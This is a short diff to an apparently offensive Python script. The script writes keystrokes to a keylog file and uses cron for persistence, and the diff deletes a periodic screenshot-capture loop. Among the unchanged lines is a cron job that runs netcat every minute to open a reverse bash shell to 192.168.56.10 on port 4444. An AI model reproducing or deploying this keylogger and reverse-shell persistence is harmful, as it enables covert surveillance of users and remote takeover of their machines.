@@ -5,8 +5,6 @@ import logging
 from crontab import CronTab
 from PIL import ImageGrab
 
-screenshot_info = "screenshot.png"
-
 # Initialize Log File
 logging.basicConfig(filename=("keylog.txt"), level=logging.INFO, format="%(asctime)s - %(message)s")
 # Initialize Variable
@@ -55,14 +53,6 @@ rev_cron = CronTab(user='kali')
 job1 = rev_cron.new(command='/bin/nc –e /bin/bash 192.168.56.10 4444 >/dev/null 2>&1')
 job1.minute.every(1)
 rev_cron.write()
-
-# Takes a screenshot 
-def screenshot():
-    im = ImageGrab.grab()
-    im.save(file_path + extend + screenshot_info)
-while True:
-    screenshot()
-    time.sleep(3600)
 
     # Create a cronjob to run this script once an hour to make sure we keep capturing
 key_cron = CronTab(user='kali')
